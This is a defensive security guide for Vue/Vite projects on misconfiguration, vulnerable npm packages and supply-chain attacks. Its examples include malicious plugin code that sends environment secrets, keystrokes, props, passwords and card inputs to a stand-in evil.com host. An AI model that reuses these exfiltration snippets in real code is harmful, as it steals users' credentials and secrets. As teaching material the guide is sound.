# A05 + A06 — Security Misconfiguration, Vulnerable Components & Supply-Chain Attacks

## Overview

Default Vite/Webpack configs ship source maps, many Vue apps run with permissive CORS and no security headers, and the npm ecosystem has a constant stream of CVEs. These are low-hanging fruit that attackers scan for automatically. Vue's fragmented plugin ecosystem (vue-router, pinia, vueuse, UI libraries — each with deep dependency trees) and Vite's build-time plugin architecture create supply-chain attack surfaces that go beyond generic npm risks.

Severity: **High**

---

## 1. Source Maps in Production (A05)

### Vulnerable Pattern
```js
// vite.config.js
defineConfig({
  build: { sourcemap: true }
})
// Attacker loads: https://yoursite.com/assets/app-abc123.js.map
// → Reconstructs every .vue file, route, API endpoint, feature flag
```

### Secure Pattern
```js
defineConfig({
  build: {
    sourcemap: false, // no .map files in production

    // Alternative: 'hidden' — generates .map for error tracking
    // (Sentry) but doesn't reference them in the JS files
    // sourcemap: 'hidden',

    rollupOptions: {
      output: {
        manualChunks: undefined, // avoid predictable chunk names
      }
    }
  }
})
```

### Use Case
A learning platform deploys with default Vite settings. An attacker loads the `.map` file and reconstructs the entire Vue source — discovering hidden admin routes, API endpoint structures, and hardcoded feature flags used for A/B testing premium features.

---

## 2. CORS Misconfiguration (A05)

### Vulnerable Pattern
```js
// ❌ Any origin can make cross-origin requests
app.use(cors({ origin: '*' }))

// ❌ Reflecting Origin header (even worse with credentials)
app.use(cors({
  origin: req.headers.origin,
  credentials: true
}))
```

### Secure Pattern
```js
const ALLOWED = ['https://app.mylearning.com', 'https://admin.mylearning.com']

app.use(cors({
  origin: (origin, cb) => {
    if (!origin || ALLOWED.includes(origin)) cb(null, true)
    else cb(new Error('CORS blocked'))
  },
  credentials: true,
  maxAge: 86400
}))
```

---

## 3. Missing Security Headers (A05)

### Vulnerable Pattern
```
// ❌ No Content-Security-Policy
// ❌ No X-Frame-Options (clickjacking)
// ❌ No Strict-Transport-Security (SSL stripping)
// ❌ No X-Content-Type-Options (MIME sniffing)
// ❌ Vue devtools enabled in production
app.config.devtools = true
```

### Secure Pattern
```js
import helmet from 'helmet'

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:"],
      connectSrc: ["'self'", "https://api.mylearning.com"],
    }
  },
  hsts: { maxAge: 63072000, includeSubDomains: true },
  frameguard: { action: 'deny' },
}))

// ✅ Disable devtools in production (main.js)
app.config.devtools = import.meta.env.DEV
app.config.performance = import.meta.env.DEV
```

---

## 4. Outdated & Vulnerable npm Packages (A06)

### Vulnerable Pattern
```json
{
  "dependencies": {
    "vue": "2.6.11",         // EOL since Dec 2023, unpatched XSS
    "axios": "0.19.0",       // SSRF CVE-2020-28168
    "lodash": "4.17.15",     // prototype pollution CVE-2021-23337
    "vue-markdown": "*",     // wildcard = uncontrolled
    "marked": "0.3.9",       // ReDoS + XSS via malformed markdown
  }
}
```

### Secure Pattern
```bash
# Regular auditing
npm audit --production
npx npm-check-updates -u

# CI gate — block deploy on high+ CVEs
npm audit --audit-level=high || exit 1

# Verify package provenance
npm audit signatures
```
```json
// Pin exact versions
"vue": "3.4.21",

// Override transitive vulnerabilities
"overrides": { "nth-check": ">=2.0.1" }
```

### Dependabot Configuration
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

### Use Case
The platform uses a markdown rendering library with a known XSS CVE. A student crafts a specially formatted lesson note that triggers XSS through the outdated library. Since the library renders within a trusted component, it bypasses any input sanitization applied at the application level.

### Checklist
1. Upgrade Vue 2 → Vue 3 immediately (Vue 2 is EOL)
2. Run `npm audit` weekly in CI
3. Set up Dependabot or Snyk
4. Use `npm overrides` for transitive fixes
5. Review changelogs before upgrading — especially for security changes
6. Pin exact versions, no `^` or `~`

---

## 5. Vue Ecosystem Supply-Chain Attacks

Unlike monolithic frameworks (Angular bundles most functionality into `@angular/core`), Vue projects assemble functionality from many independent packages — vue-router, pinia, vueuse, a UI library (Vuetify/PrimeVue/Naive UI/Element Plus), i18n, form validation, and more. Each dependency has its own transitive tree. A typical Vue 3 project installs 800–1200 packages in `node_modules`. This fragmentation creates a wide attack surface for supply-chain compromise.

The following attack vectors are specific to how Vue and Vite are architected — not generic npm risks.

### 5a. Malicious Vite Plugins (Build-Time Compromise)

A Vite plugin runs arbitrary Node.js during the build process. It can read environment variables, modify source files, inject code into the final bundle, and make network requests — all before your app reaches production. This is more powerful than a runtime dependency compromise because the injected code ships inside your legitimate bundle, passing SRI checks and CSP policies.

#### Vulnerable Pattern
```js
// vite.config.js
import vue from '@vitejs/plugin-vue'
import vueDevtols from 'vite-plugin-vue-devtols' // ← typosquat!
// Real package: vite-plugin-vue-devtools

export default defineConfig({
  plugins: [
    vue(),
    vueDevtols(), // ❌ runs arbitrary Node.js at build time
  ]
})
```

#### What a Malicious Vite Plugin Can Do
```js
// Inside the malicious plugin's transform() hook:
export default function maliciousPlugin() {
  return {
    name: 'vite-plugin-vue-devtols',
    // ❌ Exfiltrate .env secrets at build time
    configResolved(config) {
      fetch('https://evil.com/collect', {
        method: 'POST',
        body: JSON.stringify(config.env) // all env vars
      })
    },
    // ❌ Inject keylogger into every .vue file
    transform(code, id) {
      if (id.endsWith('.vue')) {
        return code + `\ndocument.addEventListener('keydown',
          e => fetch('https://evil.com/k?'+e.key))`
      }
    }
  }
}
```

#### Secure Pattern
```js
// ✅ Verify package name character-by-character before installing
// ✅ Check npm page: author, download count, repo link, publish date
// ✅ Use npm provenance verification (npm v9+)
npm audit signatures

// ✅ Lock Vite plugins to exact versions
"devDependencies": {
  "@vitejs/plugin-vue": "5.0.4",    // exact, no ^
  "vite-plugin-vue-devtools": "7.1.3" // exact, no ^
}

// ✅ Review plugin source before adding to build pipeline
// ✅ Use Socket.dev or npm provenance to verify publisher identity
```

#### Use Case
A developer searches for `vite-plugin-vue-devtools` and installs a typosquatted package with a near-identical name. During `npm run build`, the plugin reads `.env` (including `STRIPE_SECRET_KEY` that wasn't prefixed with `VITE_` — and was safe from client exposure until now). It posts the secrets to an attacker-controlled endpoint. The production bundle also contains an injected script that silently exfiltrates form inputs.

---

### 5b. Vue Plugin Global Mixin Hijacking (Runtime Compromise)

When you call `app.use(plugin)`, the plugin can register global mixins, directives, and components. A global mixin's lifecycle hooks (`beforeCreate`, `mounted`, `updated`) run inside every single component in the application. A compromised Vue plugin can silently intercept all component data, props, emitted events, and route changes.

#### Vulnerable Pattern
```js
// main.js
import { createApp } from 'vue'
import SomeAnalyticsPlugin from 'vue-analytics-tracker' // compromised

const app = createApp(App)
app.use(SomeAnalyticsPlugin) // ❌ grants full lifecycle access
```

#### What a Malicious Vue Plugin Can Do
```js
// Inside the compromised plugin:
export default {
  install(app) {
    app.mixin({
      // ❌ Runs in EVERY component — silently
      beforeCreate() {
        // Exfiltrate all props passed to every component
        const props = this.$options.propsData || this.$props
        if (props) {
          navigator.sendBeacon('https://evil.com/props',
            JSON.stringify({ component: this.$options.name, props }))
        }
      },
      mounted() {
        // ❌ Intercept all emitted events
        const originalEmit = this.$emit
        this.$emit = function(event, ...args) {
          if (event === 'submit' || event === 'login') {
            navigator.sendBeacon('https://evil.com/events',
              JSON.stringify({ event, args }))
          }
          return originalEmit.call(this, event, ...args)
        }
      }
    })

    // ❌ Register a global directive that reads input values
    app.directive('model-spy', {
      updated(el) {
        if (el.type === 'password' || el.name === 'credit_card') {
          navigator.sendBeacon('https://evil.com/input',
            JSON.stringify({ name: el.name, value: el.value }))
        }
      }
    })
  }
}
```

#### Secure Pattern
```js
// ✅ Audit plugin source before app.use() — check for:
//   - app.mixin() calls (global lifecycle hooks)
//   - app.directive() calls (DOM access)
//   - app.component() calls (global component injection)
//   - navigator.sendBeacon, fetch, XMLHttpRequest, new Image()
//   - eval(), Function(), setTimeout with strings

// ✅ Prefer composables over plugins
// Composables (useX()) are scoped to individual components
// Plugins with app.use() get global access
import { useAnalytics } from '@/composables/useAnalytics'
// ↑ Only runs where you explicitly call it

// ✅ If a plugin must be used, wrap it with an allowlist
app.use(AnalyticsPlugin, {
  // Limit what the plugin can access via its options
  trackOnly: ['pageview', 'click'],
  excludeRoutes: ['/admin', '/checkout']
})
```

#### Use Case
A learning platform installs a "Vue analytics" plugin that advertises simple page-view tracking. The plugin registers a global `beforeCreate` mixin that runs inside every component — including the login form, the payment form, and the admin panel. It silently exfiltrates email/password pairs and payment card data via `navigator.sendBeacon()`, which doesn't trigger CORS preflight and is harder to detect in network monitoring.

---

### 5c. PostCSS / Tailwind Plugin Chain (Build-Time)

Most Vue projects use Tailwind CSS, which runs through PostCSS during the build. PostCSS plugins are Node.js modules with full filesystem and network access — another build-time attack vector.

#### Vulnerable Pattern
```js
// postcss.config.js
module.exports = {
  plugins: {
    'tailwindcss': {},
    'autoprefixer': {},
    'postcss-obfuscator': {},  // ❌ unvetted PostCSS plugin
  }
}
```

A compromised PostCSS plugin can inject CSS that exfiltrates data (CSS-based keyloggers using `input[value^="a"]` selectors with background-image URLs), or it can use its Node.js execution context to read files and environment variables during the build.

#### Secure Pattern
```js
// ✅ Pin PostCSS plugin versions exactly
"devDependencies": {
  "tailwindcss": "3.4.1",   // exact
  "autoprefixer": "10.4.18" // exact
}

// ✅ Minimize PostCSS plugins — each is a build-time attack surface
// ✅ Audit any PostCSS plugin that's not from the Tailwind team
// ✅ Check: does this plugin need to be a PostCSS plugin,
//    or could it be a simpler CSS utility?
```

---

### 5d. Lockfile Integrity Across Package Managers

Vue developers commonly use pnpm (recommended by Evan You and the Vite team) which handles lockfiles and dependency resolution differently from npm and yarn. Understanding these differences matters for supply-chain security.

#### Key Differences
```bash
# npm: flat node_modules, package-lock.json
# - Risk: phantom dependencies (code can import packages
#   it doesn't declare as dependencies)
npm ci --frozen-lockfile  # ✅ but doesn't catch phantom deps

# pnpm: strict node_modules layout, pnpm-lock.yaml
# - Benefit: packages can ONLY import declared dependencies
# - Risk: lockfile manipulation — pnpm trusts lockfile integrity hashes
pnpm install --frozen-lockfile  # ✅ strict mode

# yarn: yarn.lock
yarn install --immutable  # ✅ strict mode
```

#### Secure Pattern
```bash
# ✅ Always use frozen/immutable install in CI
# npm:
npm ci
# pnpm:
pnpm install --frozen-lockfile
# yarn:
yarn install --immutable

# ✅ Treat lockfile changes as security-sensitive in code review
# Add to .github/CODEOWNERS:
package-lock.json @security-team
pnpm-lock.yaml @security-team
yarn.lock @security-team

# ✅ Detect lockfile manipulation
# Use lockfile-lint to verify registry integrity:
npx lockfile-lint --path pnpm-lock.yaml --type yarn \
  --allowed-hosts npm --validate-https
```

---

### Supply-Chain Defense Summary

1. **Vet Vite plugins like you'd vet server middleware** — they run arbitrary Node.js during build with full env access
2. **Prefer composables over app.use() plugins** — composables are scoped; plugins get global lifecycle access
3. **Audit any package that calls `app.mixin()`** — global mixins run inside every component silently
4. **Minimize PostCSS plugins** — each is a build-time Node.js execution context
5. **Pin ALL dev dependencies to exact versions** — build-tool supply-chain attacks bypass runtime defenses
6. **Use `npm audit signatures` / Socket.dev** — verify publisher provenance, not just version
7. **Treat lockfile changes as security-sensitive** — require security team review in PRs
8. **Use pnpm's strict mode** — prevents phantom dependency imports that could mask compromised packages
